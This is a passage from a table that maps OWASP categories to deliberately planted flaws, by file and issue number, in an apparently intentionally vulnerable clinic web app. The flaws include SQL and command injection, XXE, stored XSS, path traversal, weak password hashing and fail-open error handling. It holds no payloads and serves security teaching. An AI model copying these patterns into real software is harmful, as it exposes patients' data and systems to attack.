`ProtectedRoute.tsx` (client-side RBAC bypass #78); `App.tsx` + `AdminPage.tsx` (admin route no role guard #86); `App.tsx` + `StaffDashboardPage.tsx` (/staff route no role guard #102); `Sidebar.tsx` (unread badge userId param not verified #101; role-based dashboard link client-side only #103); `DashboardPage.tsx` (client-side patient filter on appointments #104); `StaffDashboardPage.tsx` (client-side doctor filter on appointments #105); `MedicalRecordsPage.tsx` (Edit button all roles #111; Dispense button all roles #112); `AdminPage.tsx` (active toggle no ADMIN check #121); `AdminRoute.tsx` (omits requiredRole #155); `ImpersonateBanner.tsx` (banner hideable by clearing localStorage key #156); `AdminUsersPage.tsx` (privileged actions chainable in 3 clicks #157); `AdminOverridesPage.tsx` (all override actions inline, single-click chain #178); `PrescriptionsPage.tsx` (patient IDOR #124; all prescriptions no role check #125; dispense no pharmacist check #126) |
| A02 | Security Misconfiguration | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, CANCELLED → DISPENSED allowed — no state machine #110); `SecurityConfig.java` (wildcard CORS, no security headers); `AdminUserService.java#resetPassword` (plaintext password in response body **and** in `audit_logs.details` #150); `AdminOpsService.java#getHealth` (JVM classpath / working dir / DB latency leaked #166); `AdminOpsService.java#setConfig` (runtime mutation of any property #167) |
| A03 | Software Supply Chain Failures + Injection | `pom.xml` (JJWT CVE-2024-31033 — outdated transitive dependency with known signature-bypass vulnerability); `AdminAuditService.java#search` (SQLi via q/action/from/to concatenated into `createNativeQuery` #158); `AdminAuditService.java#exportLogs` (CSV injection / formula execution + XML injection via unsanitized details/userAgent #162); `AdminAuditService.java#renderXmlWithTemplate` (XXE via insecure DocumentBuilderFactory defaults #163); `AdminOpsService.java#getDashboard` (SQLi via since #165); `AdminOpsService.java#runSql` (arbitrary SQL execution #168); `AdminOpsService.java#backup` (command injection via dbName spliced into sh -c #170); **Frontend**: `AdminLogDetailPage.tsx` (audit details rendered via `dangerouslySetInnerHTML` — stored XSS sink #161); `AdminLogsPage.tsx` (XML export toast-warns then downloads anyway #164); `AdminOpsPage.tsx` (Run-SQL result cells rendered as HTML — stored XSS pivot #171) |
| A04 | Cryptographic Failures | `application.yaml`, `V10`/`V11`/`V12` (MD5 seed passwords for all 9 accounts #96), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminOpsController.java` (`GET /config` exposes raw datasource.password and all env vars — moved from old AdminController); `AdminUserService.java#bulkDelete` (unbounded batch — DoS-class insecure design #152); `AdminOpsService.java#restart` (`System.exit(0)` reachable by any caller #169); `AdminStaffService.java#verifyLicense` (client-claim verification — no external registry check #179); `AdminStaffService.java#updateDoctor` (verified flag mutable in same call #180); `Doctor.java` + `V19` (licenseVerified flag with no audit trail #184); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client); **Frontend**: `AuthContext.tsx` (passwordHash in localStorage #79); `LoginPage.tsx` (raw server error in UI #80); `DashboardPage.tsx` (passwordHash column in admin table #82); `AdminPage.tsx` (password field type="text" in create modal #120; MD5 hash copyable in user table #122); `ImpersonateBanner.tsx` (hideable banner — visibility gap when impersonating #156); `AdminOpsPage.tsx` (secrets red-flagged then rendered plaintext anyway #172) |
| A05 | Injection | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param; 4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `AppointmentService.java` (SQL injection via `doctorName`); `V8` + `Message.java` (Stored XSS); `MessageService.java` (Stored XSS via unsanitized content); `AdminStaffService.java#onboardStaff` (path traversal via licenseDocument `getOriginalFilename()` + REPLACE_EXISTING #181); `AdminBroadcastService.java#broadcast` (HTML body stored verbatim into Message.content — stored XSS at scale #185); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF); `StatsController.java` (GET /recent — all users' events with no auth filter #97; unreadMessages system-wide count #98); **Frontend**: `MessagesPage.tsx` (`dangerouslySetInnerHTML` Stored XSS #84); `DashboardPage.tsx` (recent activity feed renders cross-user events #100); `AdminOnboardingPage.tsx` (uploadedFilename rendered via `dangerouslySetInnerHTML` #183); `AdminBroadcastPage.tsx` (composer preview pane renders draft HTML via `dangerouslySetInnerHTML` #189) |
| A06 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `AdminUserService.java#generateRandomPassword` (java.util.Random not SecureRandom #153); `AdminUserDetailDto.java` (passwordHash bundled in detail response #154); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For); **Frontend**: `AuthContext.tsx` (JWT + passwordHash in localStorage #76, #79; unverified JWT decode #77); `axiosInstance.ts` (localStorage read on every request #81); `DashboardPage.tsx` (Token Inspector widget #83; user ID in greeting banner #99); `ProfilePage.tsx` (JWT in URL query param on export #85); `LabResultsPage.tsx` (export to clipboard includes patient ID without access check #114) |
| A07 | Authentication Failures | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body #109); `AdminUserController.java` (role from body → instant ADMIN creation); `AdminUserService.java#updateUser` (mass-assignment of passwordHash/lockedUntil/active #147); `AdminUserService.java#unlock` (clears lockedUntil + failedLoginAttempts — defeats brute-force lockout #149); `AdminUserService.java#impersonate` (JWT minted for any user, no MFA, no audit #151); `AdminClinicalService.java#updatePrescription` (mass-assigns patientId / dispensedAt — medication-history forgery #174); `AdminStaffService.java#onboardStaff` (multipart role accepted incl. ADMIN — second unauth ADMIN-creation surface #182); `AdminBroadcastService.java#broadcast` (senderId from body — broadcast attributed to any user #186); **Frontend**: `RegisterPage.tsx` (ADMIN role selectable on signup); `AdminPage.tsx` (role change Mass Assignment #87; create user role from body #119); `MessagesPage.tsx` (senderId editable in compose form #88; replySenderId editable in inline reply — impersonate any user #117); `PrescriptionsPage.tsx` (pharmacistId from request body — audit identity spoofable #127) |
| A08 | Software or Data Integrity Failures | `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request); `AdminClinicalService.java#overrideLabResultValue` (mutates resultValue/referenceRange with no amended flag, original value lost #177); `AdminBroadcastService.java#redact` (overwrites Message.content in place, no original preserved #188) |
| A09 | Security Logging and Alerting Failures | `AdminAuditController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack; `DELETE /logs/{id}` selective tampering #160); `AdminUserService.java#deleteUser` (hard-delete of any account incl. ADMIN, no archive #148); `AdminUserService.java#bulkDelete` (single audit entry covers many ids #152); `AdminClinicalService.java#deleteMedicalRecord` (hard-delete clinical history + cascade via V18 #176); `AdminBroadcastService.java#redact` (message content overwritten, original lost; pairs with #160 to fully erase the message #188); `AdminOpsService.java#setConfig` (runtime mutation can disable dynamic-read audit hooks #167); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs); `AdminPage.tsx` (Clear All Logs button fires immediately with no confirmation — single click destroys forensic timeline #123) |
| A10 | Mishandling of Exceptional Conditions | `AdminAuditService.java#findById` returns raw stack trace bytes → `AdminLogDetailPage.tsx` renders them via `dangerouslySetInnerHTML` (#159 + #161 chain). **Async Refill Queue feature** (see `A10_FEATURE_PLAN.md`): `RefillQueueService.java` (fail-open promote-to-READY on any validator exception — CWE-636 #128; `catch (Throwable)` around slip printing — CWE-396 #129; `@Scheduled` worker swallows every exception — CWE-755 #130; TOCTOU race on dispense — CWE-362 #131; swallowed `InterruptedException` — CWE-705 #132); `EligibilityValidator.java` (no null check — CWE-754 #133); `V16__create_refill_requests.sql` (schema permits null quantity that triggers the NPE — CWE-665 #134; no UNIQUE constraint for the double-dispense race); `SlipPrinter.java` (write outside try/finally — CWE-460 #135); `RefillRequestDto.java` (raw `failureReason` exception text leaked — CWE-209 #136; absolute `tempSlipPath` leaked #137); `RefillController.java` (`/retry` has no max-retry guard — CWE-400 #138); `SecurityConfig.java` (`/api/refills/**` mapped to `permitAll()` — A01 compounds A10 #139). **Frontend**: `PrescriptionsPage.tsx` (Request Refill button submits `quantity: null` on purpose — feeds the fail-open chain #140); `RefillsPage.tsx` (Dispense button not disabled in-flight — CWE-362 reproducible from UI #141; "Force Concurrent Dispense" button fires 10 parallel calls #142; `failureReason` rendered with `dangerouslySetInnerHTML` — stored XSS pivot #143; Stack-Trace Inspector renders raw exception text + absolute paths — CWE-209 #144); `AdminPage.tsx` + `ProfilePage.tsx` (also render `failureReason` as raw HTML — #143). **Related existing items also touching A10**: `JwtAuthenticationFilter.java` (silently swallows JWT parse exceptions and proceeds as anonymous), `LoggingInterceptor.java` (`ex.printStackTrace(pw)` + logging errors silently swallowed — CWE-209 / CWE-755), `GlobalExceptionHandler.java` (returns raw exception class + message to client). |
